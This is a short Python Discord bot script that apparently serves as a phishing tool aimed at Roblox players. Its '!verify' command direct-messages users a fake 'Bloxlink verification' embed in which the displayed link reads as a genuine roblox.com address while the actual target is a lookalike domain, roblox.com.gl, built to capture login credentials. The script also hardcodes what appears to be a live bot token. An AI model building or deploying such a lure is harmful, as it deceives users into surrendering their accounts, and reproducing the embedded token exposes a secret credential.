import discord
from discord.ext import commands
import requests

################### change these to your liking ###################

token = "OTM3MTYwMTQ4NjAwODk3NjM2.YfXsZw.aOWwDnXZilpLtUcCroqQno13nJE"
prefix = "!"
title = "Please Complete Verification"
desc ="To verify your account, please join BloxLink\'s Official Roblox Verification Game"
field = ":arrow_down_small: Please Login and join the game :arrow_down_small:"
hyperlink = "https://roblox.com/games/429530"
phish = "https://roblox.com.gl/games/1271943503/Bloxlink-Verification-Game?privateServerLinkCode=85865803913869583274473004671435"

###################################################################



client = commands.Bot(command_prefix = prefix)
client.remove_command('help')

@client.event
async def on_ready():
    print('')
    print('----------------')
    print('Selfbot Online!')
    print('----------------')

main = discord.Embed(title=title,description=desc,color=0xcf4948)
main.add_field(name=field,value=f"[{hyperlink}]({phish})")
main.set_thumbnail(url='https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png')

@client.command()
async def verify(ctx):
    await ctx.send('***Sent Verification Link! Please Check DMs***')
    await ctx.author.send(embed=main)







client.run(token)
